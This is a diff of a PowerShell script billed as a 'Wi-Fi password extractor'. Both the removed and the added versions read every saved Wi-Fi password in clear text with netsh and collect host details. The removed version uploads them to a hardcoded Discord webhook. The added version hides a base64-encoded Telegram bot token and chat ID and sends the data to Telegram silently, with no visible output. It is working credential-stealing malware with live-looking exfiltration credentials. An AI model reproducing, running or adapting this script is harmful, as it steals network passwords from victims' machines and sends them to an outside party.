@@ -1,43 +1,16 @@
 # ========== CONFIG ==========
-$DebugMode = $false  # <-- Set to $true for verbose logging, keep window open
+$VerboseMode = $false   # Set $true to enable Write-Host
 
-# ========== INTERNAL LOGGER ==========
-function Write-DebugLog {
-    param([string]$Message)
-    if ($DebugMode) {
-        $timeStamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-        Write-Output "[$timeStamp] DEBUG: $Message"
-    }
-}
+# ========== BASE64 CONFIG ==========
+$BotToken_B64 = "ODAzMTQzNTU3NjpBQUdkQ0dNNjNmdXF1VTVzSlI0ODVPV09qdW1rN1dJSFpDMA=="
+$ChatID_B64 = "MTg0OTI2OTcwOA=="
 
-# ========== BANNER ==========
-$banner = @"
-===========================================
-   WIFI PASSWORD EXTRACTOR - SQD5 TOOL
-===========================================
-"@
-Write-Host $banner
+# Decode at runtime
+$BotToken = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($BotToken_B64))
+$ChatID = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($ChatID_B64))
 
-# ========== SPINNER ==========
-function Show-Spinner {
-    param(
-        [int]$Seconds = 2,
-        [string]$Message = "Preparing script..."
-    )
-    if (-not $DebugMode) { return }
-    $frames = @('/','-','\','|')
-    $end = (Get-Date).AddSeconds($Seconds)
-    $i = 0
-    while ((Get-Date) -lt $end) {
-        $frame = $frames[$i % $frames.Count]
-        Write-Host -NoNewline ("`r{0} {1}" -f $frame, $Message)
-        Start-Sleep -Milliseconds 150
-        $i++
-    }
-    Write-Host "`r$Message"
-}
-
-Show-Spinner -Seconds 2 -Message "Preparing script..."
+# Telegram endpoint
+$SendDocURL = "https://api.telegram.org/bot$BotToken/sendDocument"
 
 # ========== ADMIN CHECK ==========
 $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
@@ -48,174 +21,80 @@ if (-not $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administra
     exit 1
 }
 
-# ========== OUTPUT FILE ==========
-$outFile = Join-Path $env:USERPROFILE "Downloads\netshreport.txt"
-Write-Host "Output will be saved to: $outFile"
-Write-DebugLog "Output file: $outFile"
 
-# ========== INIT FILE ==========
-Try {
-    "=============================`nWi-Fi Password Extractor`n=============================`n" | Out-File -FilePath $outFile -Encoding UTF8 -Force
-    Write-Host "Initializing output file..."
-    Write-DebugLog "Initialized output file."
-} Catch {
-    Write-Host "ERROR: Cannot write to $outFile. Check permissions."
-    exit 1
-}
+# ========== LOG FUNCTION ==========
+function Write-Log { param([string]$Message); if ($VerboseMode) { Write-Host $Message } }
 
-# ========== GET PROFILES ==========
-Write-Host "Getting available Wi-Fi profiles..."
-Try {
-    $profiles = netsh wlan show profiles 2>$null |
-        Select-String "All User Profile" |
-        ForEach-Object { $_.ToString().Split(':',2)[1].Trim() } | Sort-Object -Unique
-    Write-DebugLog "Found $($profiles.Count) profiles."
-} Catch {
-    $profiles = @()
-    Write-Host "Failed to read Wi-Fi profiles."
-    Write-DebugLog "No profiles found or error during extraction."
-}
+# ========== GATHER PC INFO ==========
+$computer = $env:COMPUTERNAME
+$cs = Get-CimInstance Win32_ComputerSystem
+$model = ($cs.Model).Trim()
+$cpu = (Get-CimInstance Win32_Processor).Name
+$cores = (Get-CimInstance Win32_Processor).NumberOfCores
+$osCaption = (Get-CimInstance Win32_OperatingSystem).Caption.Trim()
+$dateTime = (Get-Date).ToString("yyyy-MM-dd HH-mm-ss")
 
-if (-not $profiles) {
-    Write-Host "No Wi-Fi profiles found."
-    "No WLAN profiles found.`n=============================`nDone. No profiles found.`nVisit README: https://github.com/09sychic/sqd5/blob/main/README.md`n=============================" | Out-File -FilePath $outFile -Append -Encoding UTF8
-    if (-not $DebugMode) { exit 0 }
-    else {
-        Write-Output "`n[DEBUG MODE] Window will stay open. Press any key to close..."
-        $null = Read-Host
-    }
-    exit 0
-}
-
-# ========== PROCESS PROFILES ==========
-Write-Host "Extracting passwords from profiles..."
-foreach ($p in $profiles) {
-    Write-Host "Checking: $p"
-    Try {
-        $info = netsh wlan show profile name="$p" key=clear 2>$null
-    } Catch {
-        $info = $null
-        Write-Host "Failed to read profile: $p"
-        Write-DebugLog "Failed to extract info for: $p"
-    }
-
-    $keyLine = ($info | Select-String "Key Content" | ForEach-Object {
-        $_.ToString().Split(':',2)[1].Trim()
-    }) -join ''
-
-    if (-not $keyLine) {
-        $keyLine = "<No password saved or open network>"
-    }
-
-    "SSID: $p`nPASS: $keyLine`n===" | Out-File -FilePath $outFile -Append -Encoding UTF8
-    Write-Host "Saved: SSID=$p"
-    Write-DebugLog "Written: SSID=$p, PASS=$keyLine"
-}
-# ========== SYSTEM INFO (SAFE) ==========
-$computer   = $env:COMPUTERNAME
-$cs         = Get-CimInstance Win32_ComputerSystem
-$model      = ($cs.Model).Trim()
-$cpu        = (Get-CimInstance Win32_Processor).Name
-$osObj      = Get-CimInstance Win32_OperatingSystem
-$osCaption  = ($osObj.Caption).Trim()
-$date       = (Get-Date).ToUniversalTime().AddHours(8).ToString("MMM dd, yyyy hh:mm tt")
-
-# Build summary block
-$pcInfo = @"
-Date: $date
-Computer: $computer
-Model: $model
-CPU: $cpu
+$pcInfoHeader = @"
+=============================
+$computer
+$model
+$cpu
+C$cores
 OS: $osCaption
-
-"@
-
-# ========== FOOTER ==========
-$footer = @"
-=============================
-$pcInfo
-Done. Results saved to: $outFile
-Visit README for more info:
-https://github.com/09sychic/sqd5/blob/main/README.md
+Date: $dateTime
 =============================
 "@
 
+# ========== EXTRACT WIFI PASSWORDS ==========
+$profiles = netsh wlan show profiles 2>$null |
+Select-String "All User Profile" |
+ForEach-Object { $_.ToString().Split(':', 2)[1].Trim() } | Sort-Object -Unique
 
-
-$footer | Out-File -FilePath $outFile -Append -Encoding UTF8
-Write-Host "Extraction complete. File saved at:"
-Write-Host "$outFile"
-
-# ========== SUPPRESS NOISE ==========
-$ErrorActionPreference = 'SilentlyContinue'
-$WarningPreference = 'SilentlyContinue'
-$ProgressPreference = 'SilentlyContinue'
-
-# ========== WAIT 5 SECONDS ==========
-Write-DebugLog "Waiting before sending to Discord..."
-Start-Sleep -Seconds 1.8
-
-# ========== SEND TO DISCORD (PowerShell 5.1 Compatible) ==========
-# (Unmodified section below)
-
-$WebhookURL = "https://discord.com/api/webhooks/1446350397366337687/RrwTNt1GBsQq73N3ztMQuZJvzwjfA8gbvxNsyHYLCaM-fSxiXiQzAHMIIubbjnXrOV18"
-if (Test-Path $outFile) {
-    Write-DebugLog "File exists. Preparing to filter and send to Discord."
-    $FilteredLines = Get-Content $outFile | Where-Object { $_ -ne "PASS: <No password saved or open network>" }
-
-    # Build temp upload file name with date, computer, model, OS
-    $computer   = $env:COMPUTERNAME
-    $cs         = Get-CimInstance Win32_ComputerSystem
-    $model      = ($cs.Model).Trim()
-    $osObj      = Get-CimInstance Win32_OperatingSystem
-    $osCaption  = ($osObj.Caption).Trim()
-    $date       = Get-Date -Format 'MMM dd'
-
-    $parts = @($date, $computer, $model, $osCaption)
-    $invalidChars = [IO.Path]::GetInvalidFileNameChars()
-    $sanitized = $parts | ForEach-Object {
-        $s = $_.ToString().Trim()
-        foreach ($c in $invalidChars) { $s = $s -replace [regex]::Escape($c), '_' }
-        $s
-    }
-
-    $TempUploadFile = Join-Path $env:TEMP ( ($sanitized -join ' - ') + ' - netshreport.txt' )
-
-    $FilteredLines | Set-Content -Path $TempUploadFile -Encoding UTF8
-    try {
-        $boundary = [System.Guid]::NewGuid().ToString()
-        $LF = "`r`n"
-        $fileBytes = [System.IO.File]::ReadAllBytes($TempUploadFile)
-        $fileName = [System.IO.Path]::GetFileName($TempUploadFile)
-        $bodyLines = @()
-        $bodyLines += "--$boundary"
-        $bodyLines += "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`""
-        $bodyLines += "Content-Type: text/plain$LF"
-        $bodyLines += [System.Text.Encoding]::UTF8.GetString($fileBytes)
-        $bodyLines += "--$boundary--$LF"
-        $body = [System.Text.Encoding]::UTF8.GetBytes(($bodyLines -join $LF))
-        $headers = @{ "Content-Type" = "multipart/form-data; boundary=$boundary" }
-        $response = Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $body -Headers $headers
-    } catch {
-        Write-DebugLog "ERROR sending to Discord: $($_.Exception.Message)"
-    } finally {
-        if (Test-Path $TempUploadFile) {
-            Remove-Item $TempUploadFile -Force -ErrorAction SilentlyContinue
-        }
+$wifiInfo = @()
+if ($profiles.Count -eq 0) {
+    $wifiInfo += ""
+}
+else {
+    foreach ($p in $profiles) {
+        $info = netsh wlan show profile name="$p" key=clear 2>$null
+        $keyLine = ($info | Select-String "Key Content" | ForEach-Object { $_.ToString().Split(':', 2)[1].Trim() }) -join ''
+        if (-not $keyLine) { $keyLine = "<No password saved or open network>" }
+        $wifiInfo += "SSID: $p`nPASS: $keyLine`n---"
     }
 }
 
+# ========== CREATE TEMP FILE ==========
+$fileName = "$computer - netshreport - $dateTime.txt"
+$tempFile = Join-Path $env:TEMP $fileName
 
-if ($DebugMode) {
-    if (Test-Path $outFile) {
-        Write-Output "`n[DEBUG MODE] Script completed. Final file still in:`n$outFile"
-    } else {
-        $movedFile = Get-ChildItem -Path "$env:TEMP" -Filter "wlan_final_*.txt" | Sort-Object LastWriteTime -Descending | Select-Object -First 1
-        if ($movedFile) {
-            Write-Output "`n[DEBUG MODE] Script completed. File MOVED to:`n$($movedFile.FullName)"
-        }
-    }
-    Write-Output "Window will stay open. Press any key to close..."
-    $null = Read-Host
+$pcInfoHeader | Out-File -FilePath $tempFile -Encoding UTF8
+$wifiInfo | Out-File -FilePath $tempFile -Encoding UTF8 -Append
+
+# ========== SEND TO TELEGRAM ==========
+try {
+    $boundary = [guid]::NewGuid().ToString()
+    $LF = "`r`n"
+    $fileBytes = [System.IO.File]::ReadAllBytes($tempFile)
+
+    $body = "--$boundary$LF"
+    $body += "Content-Disposition: form-data; name=`"chat_id`"$LF$LF$ChatID$LF"
+    $body += "--$boundary$LF"
+    $body += "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`"$LF"
+    $body += "Content-Type: text/plain$LF$LF"
+
+    $bodyBytes = [Text.Encoding]::UTF8.GetBytes($body)
+    $endBytes = [Text.Encoding]::UTF8.GetBytes("$LF--$boundary--$LF")
+    $payload = $bodyBytes + $fileBytes + $endBytes
+
+    $wc = New-Object Net.WebClient
+    $wc.Headers["Content-Type"] = "multipart/form-data; boundary=$boundary"
+
+    $wc.UploadData($SendDocURL, "POST", $payload) | Out-Null
+    Write-Log ""
 }
-
+catch {
+    Write-Log " $($_.Exception.Message)"
+}
+finally {
+    if (Test-Path $tempFile) { Remove-Item $tempFile -Force -ErrorAction SilentlyContinue }
+}
